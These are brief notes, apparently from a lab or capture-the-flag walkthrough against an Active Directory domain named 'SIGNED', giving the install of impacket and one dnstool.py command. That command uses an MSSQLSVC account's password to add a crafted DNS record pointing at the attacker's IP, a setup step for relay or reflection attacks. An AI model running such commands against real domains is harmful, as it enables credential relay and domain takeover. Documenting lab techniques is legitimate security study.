
### dnstools.py

```bash

pip install impacket pycryptodome

```

creating dns entry

```python3
python3 dnstool.py -u 'SIGNED\MSSQLSVC' -p 'password' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d  <our ip> <machine ip>


```